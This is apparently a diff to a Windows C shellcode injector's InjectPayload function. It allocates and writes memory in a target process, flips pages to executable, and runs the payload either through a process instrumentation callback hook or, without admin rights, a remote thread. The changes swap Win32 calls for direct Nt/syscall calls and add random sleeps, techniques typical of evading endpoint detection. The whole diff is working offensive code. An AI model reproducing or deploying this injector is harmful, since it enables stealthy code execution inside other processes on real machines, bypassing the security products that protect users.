@@ -166,48 +166,44 @@ BOOL InjectPayload(HANDLE hProcess, unsigned char* buffer, int bufferlen)
 
     HMODULE kernel32 = (HMODULE)getModuleByName(aKernel32dll);
     // pGetProcAddress _GetProcAddress = (pGetProcAddress) getFuncByName(kernel32, aGetProcAddress);
-    pVirtualAllocEx _VirtualAllocEx = (pVirtualAllocEx)getFuncByName(kernel32, aVirtualAllocEx);
+    //pVirtualAllocEx _VirtualAllocEx = (pVirtualAllocEx)getFuncByName(kernel32, aVirtualAllocEx);
 
-    LPVOID jumper = _VirtualAllocEx(hProcess, NULL, jumper_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-    LPVOID checkmem = _VirtualAllocEx(hProcess, NULL, 16, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    //LPVOID jumper = _VirtualAllocEx(hProcess, NULL, jumper_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    //LPVOID checkmem = _VirtualAllocEx(hProcess, NULL, 16, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     
+    PVOID jumper = 0;
+    PVOID checkmem = 0;
+    SIZE_T buflen = PAGE_ALIGN(bufferlen);
+    SIZE_T jmp_size = jumper_size;
+    SIZE_T checkmem_size = 16;
+    NtAllocateVirtualMemory(hProcess, (PVOID *)( & jumper), 0, (PSIZE_T)( & jmp_size), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
+    NtAllocateVirtualMemory(hProcess, (PVOID*)( & checkmem), 0, (PSIZE_T)(&checkmem_size), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
+    if (jumper == NULL || checkmem == NULL)
+    {
+#ifdef DEBUG
+        printf("[x] Failed to allocate jumper memory for 1nj3ct10n, operation abort!\n");
+#endif
+        exit(0);
+    }
+
 #ifdef DEBUG
     printf("[+] Jumper 4ddr: %p\n", jumper);
     printf("[+] Check mem addr: %p\n", checkmem);
 #endif
 
-    LPVOID mem = _VirtualAllocEx(hProcess, NULL, PAGE_ALIGN(bufferlen), MEM_COMMIT, PAGE_READWRITE);
+    //LPVOID mem = _VirtualAllocEx(hProcess, NULL, PAGE_ALIGN(bufferlen), MEM_COMMIT, PAGE_READWRITE);
+    LPVOID mem = NULL;
+    NtAllocateVirtualMemory(hProcess, (PVOID*)&mem, 0, (PSIZE_T)(&buflen), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
+    if (mem == NULL)
+    {
+#ifdef DEBUG
+        printf("[x] Failed to allocate sh3llc0d3 memory for 1nj3ct10n, operation abort!\n");
+#endif
+        exit(0);
+    }
 #ifdef DEBUG
     printf("[+] Sh3llc0d3 4ddr: %p\n", mem);
 #endif
-    
-
-    // BYTE jumperTemplate[49] = {
-    //     0x55,
-    //     0x48, 0x89, 0xe5,
-    //     0x48, 0xc7, 0x05, 0xf1, 0xff, 0xff, 0xff, 0x41, 0xff, 0xe2, 0x00,
-    //     0x50,
-    //     0x53,
-    //     0x51,
-    //     0x41, 0x51,
-    //     0x41, 0x52,
-    //     0x41, 0x53,
-    //     0x48, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    //     0xff, 0xd0,
-    //     0x41, 0x5b,
-    //     0x41, 0x5a,
-    //     0x41, 0x59,
-    //     0x59,
-    //     0x5b,
-    //     0x58,
-    //     0x5d,
-    //     0x41, 0xff, 0xe2
-    // };
-
-
-    // change address of jump to our shellcode
-    // *((DWORD64*)(&(jumperTemplate[26]))) = (DWORD64)mem;
-
 
     #define NEWPAYLOAD
     #ifdef NEWPAYLOAD
@@ -218,7 +214,7 @@ BOOL InjectPayload(HANDLE hProcess, unsigned char* buffer, int bufferlen)
     pSleep _Sleep = (pSleep) getFuncByName(kernel32, aSleep);
 
 
-    DWORD syscall_num = (DWORD)SW2_GetSyscallNumber(0x98B3CA56);
+    DWORD syscall_num = (DWORD)SW2_GetSyscallNumber(0x098B0D666);
     DWORD64 syscall_addr = (DWORD64) SW2_GetRandomSyscallAddress();
     
     DWORD randomsleeptime = (rand() % 10) + 5;
@@ -294,10 +290,13 @@ BOOL InjectPayload(HANDLE hProcess, unsigned char* buffer, int bufferlen)
     }
     check = _WriteProcessMemory(hProcess, checkmem, "\x00\x00\x00\x00\x00\x00\x00\x00", 0x8, NULL);
 
-    pVirtualProtectEx _VirtualProtectEx = (pVirtualProtectEx)getFuncByName(kernel32, aVirtualProtectEx);
-    DWORD oldProtect = PAGE_READWRITE;
-    check = _VirtualProtectEx(hProcess, mem, bufferlen, PAGE_EXECUTE_READWRITE, &oldProtect);
-    if (check)
+    //pVirtualProtectEx _VirtualProtectEx = (pVirtualProtectEx)getFuncByName(kernel32, aVirtualProtectEx);
+
+    ULONG oldProtect = PAGE_READWRITE;
+    //check = _VirtualProtectEx(hProcess, mem, bufferlen, PAGE_EXECUTE_READWRITE, &oldProtect);
+
+    NTSTATUS stat = NtProtectVirtualMemory(hProcess, (PVOID *)&mem, (PSIZE_T)(&buflen), PAGE_EXECUTE_READWRITE, &oldProtect);
+    if (stat == 0)
     {
 #ifdef DEBUG
         printf("[+] Change sh3llc0d3 protection successfully!\n");
@@ -312,8 +311,9 @@ BOOL InjectPayload(HANDLE hProcess, unsigned char* buffer, int bufferlen)
         return FALSE;
     }
 
-    check = _VirtualProtectEx(hProcess, jumper, jumper_size, PAGE_EXECUTE_READ, &oldProtect);
-    if (check)
+    //check = _VirtualProtectEx(hProcess, jumper, jumper_size, PAGE_EXECUTE_READ, &oldProtect);
+    stat = NtProtectVirtualMemory(hProcess, (PVOID*)&jumper, (PSIZE_T)(&jmp_size), PAGE_EXECUTE_READ, &oldProtect);
+    if (stat == 0)
     {
 #ifdef DEBUG
         printf("[+] Change jumper protection successfully!\n");
@@ -330,39 +330,63 @@ BOOL InjectPayload(HANDLE hProcess, unsigned char* buffer, int bufferlen)
 
     getchar();
 
-    PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION procinfo;
-    procinfo.Reserved = 0;
-    procinfo.Version = 0;
-    procinfo.Callback = (PVOID)(ULONG_PTR)jumper;
-
-    pLoadLibraryA _LoadLibraryA = (pLoadLibraryA)getFuncByName(kernel32, aLoadLibraryA);
-    HMODULE ntdll = _LoadLibraryA(aNtDlldll);
-    pNtSetInformationProcess _NtSetInformationProcess = (pNtSetInformationProcess)getFuncByName(ntdll, aNtSetInformationProcess);
-
-    if (_NtSetInformationProcess == NULL)
+    if (IsRunningAsAdmin())
     {
-#ifdef DEBUG
-        printf("[x] Resolve NtSetInformationProcess failed!\n");
-#endif
-        return FALSE;
-    }
-    NTSTATUS stat = _NtSetInformationProcess(hProcess, ProcessInstrumentationCallback, &procinfo, sizeof(procinfo));
+        PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION procinfo;
+        procinfo.Reserved = 0;
+        procinfo.Version = 0;
+        procinfo.Callback = (PVOID)(ULONG_PTR)jumper;
 
-    if (!NT_SUCCESS(stat))
-    {
+        pLoadLibraryA _LoadLibraryA = (pLoadLibraryA)getFuncByName(kernel32, aLoadLibraryA);
+        HMODULE ntdll = _LoadLibraryA(aNtDlldll);
+        pNtSetInformationProcess _NtSetInformationProcess = (pNtSetInformationProcess)getFuncByName(ntdll, aNtSetInformationProcess);
+
+        if (_NtSetInformationProcess == NULL)
+        {
 #ifdef DEBUG
-        printf("[x] Failed to deploy hook!\n");
-        PrintLastError(stat);
+            printf("[x] Resolve NtSetInformationProcess failed!\n");
 #endif
-        return FALSE;
+            return FALSE;
+        }
+        stat = _NtSetInformationProcess(hProcess, ProcessInstrumentationCallback, &procinfo, sizeof(procinfo));
+
+        if (!NT_SUCCESS(stat))
+        {
+#ifdef DEBUG
+            printf("[x] Failed to deploy hook!\n");
+            PrintLastError(stat);
+#endif
+            return FALSE;
+        }
+        else
+        {
+#ifdef DEBUG
+            printf("[+] Hook deploying successfully, waiting to be trigger...!\n");
+#endif
+            return TRUE;
+        }
     }
     else
     {
+        printf("[+] Process is running not under admin privilege, fallback to second plan!\n");
+        HANDLE threadHandle;
+        stat = NtCreateThreadEx(&threadHandle, THREAD_ALL_ACCESS, NULL, hProcess, (PVOID)mem, NULL, 0, 0, 0, 0, NULL);
+        if (stat == 0)
+        {
 #ifdef DEBUG
-        printf("[+] Hook deploying successfully, waiting to be trigger...!\n");
+            printf("[+] Thread create successfully!\n");
 #endif
-        return TRUE;
+            return TRUE;
+        }
+        else
+        {
+#ifdef DEBUG
+            printf("[+] Failed to create thread!\n");
+            return FALSE;
+#endif
+        }
     }
+    
 }
 
 #undef PAGE_SIZE
